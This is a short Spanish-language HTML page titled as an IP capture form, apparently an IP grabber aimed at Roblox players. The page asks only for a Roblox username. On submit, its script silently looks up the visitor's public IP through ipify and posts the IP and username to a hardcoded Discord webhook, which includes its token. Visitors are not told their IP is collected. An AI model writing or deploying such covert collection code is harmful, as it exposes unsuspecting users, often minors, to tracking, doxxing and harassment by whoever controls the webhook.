<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Captura de IP</title>
    <script>
        async function sendContact(event) {
            event.preventDefault();

            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const userIP = ipData.ip;

            const username = document.getElementById('username').value;

            const data = {
                content: `Nueva entrada:\nIP: ${userIP}\nUsuario de Roblox: ${username}`,
            };

            fetch('https://discord.com/api/webhooks/1411003921953984512/eWRarF44aGvN0ZatZ4S4IxA9IH8JGb_KA7nLuZlaFj2G3FdFUrZLHW28egfPg6cC4092', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
        }
    </script>
</head>
<body>
    <form onsubmit="sendContact(event)">
        <div>
            <label for="username">Nombre de Usuario de Roblox:</label>
            <input type="text" id="username" required>
        </div>
        <button type="submit">Enviar</button>
    </form>
</body>
</html>
